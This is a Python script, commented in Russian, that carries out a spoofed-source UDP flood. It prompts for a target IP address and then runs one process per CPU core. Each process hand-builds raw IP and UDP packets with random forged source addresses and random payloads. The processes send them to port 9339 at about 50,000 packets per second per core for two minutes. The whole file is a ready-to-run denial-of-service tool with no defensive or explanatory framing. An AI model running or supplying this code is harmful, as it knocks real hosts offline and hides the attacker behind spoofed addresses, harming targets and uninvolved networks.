#!/usr/bin/env python3
import socket
import random
import time
import multiprocessing as mp
from scapy.all import IP, UDP, Raw, send  # scapy нужен

TARGET_IP = input("Введите целевой IP-адрес: ")
TARGET_PORT = 9339
DURATION = 120
PPS_PER_CORE = 50000  # пакетов/сек на ядро
PACKET_MIN = 64
PACKET_MAX = 1200

def random_ip():
    return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def flood_worker(core_id):
    end_time = time.time() + DURATION
    # raw сокет для максимальной скорости
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    
    pps = PPS_PER_CORE
    delay = 1.0 / pps
    
    while time.time() < end_time:
        payload = random.randbytes(random.randint(PACKET_MIN, PACKET_MAX))
        src_ip = random_ip()
        # Ручной IP-пакет
        ip_header = (
            b'\x45\x00' +  # версия, IHL
            (20 + len(payload)).to_bytes(2, 'big') +  # длина
            random.getrandbits(16).to_bytes(2, 'big') +  # ID
            b'\x00\x00' +  # флаги, смещение
            b'\x40\x11' +  # TTL=64, протокол UDP
            (0).to_bytes(2, 'big') +  # контрольная сумма (0 для raw)
            socket.inet_aton(src_ip) +
            socket.inet_aton(TARGET_IP)
        )
        udp_header = (
            random.randint(10000, 65535).to_bytes(2, 'big') +  # sport
            TARGET_PORT.to_bytes(2, 'big') +
            (8 + len(payload)).to_bytes(2, 'big') +
            b'\x00\x00'  # checksum (0)
        )
        packet = ip_header + udp_header + payload
        sock.sendto(packet, (TARGET_IP, 0))
        time.sleep(delay)

if __name__ == "__main__":
    cores = mp.cpu_count()
    print(f"[+] Запуск на {cores} ядрах с подменой source IP")
    processes = []
    for i in range(cores):
        p = mp.Process(target=flood_worker, args=(i,))
        p.start()
        processes.append(p)
    time.sleep(DURATION)
    for p in processes:
        p.terminate()
    print("[+] Готово.")
